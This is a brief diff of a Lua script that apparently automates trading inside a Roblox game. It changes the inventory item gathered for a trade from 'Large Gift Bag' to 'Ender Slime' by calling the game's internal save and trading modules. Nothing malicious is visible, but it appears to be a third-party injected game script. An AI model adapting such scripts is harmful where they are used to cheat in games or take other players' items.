@@ -1,7 +1,7 @@
 local itemsToTrade = {}
 for i, v in next, Library.Save.Get().Inventory.Misc do
-    if v.id == "Large Gift Bag" then
-        table.insert(itemsToTrade, {["Class"] = "Misc", ["uid"] = i, ["Item"] = v})
+    if v.id == "Ender Slime" then
+        table.insert(itemsToTrade, {["Class"] = "Pet", ["uid"] = i, ["Item"] = v})
     end
 end
 if not TradingCmds.GetState() then
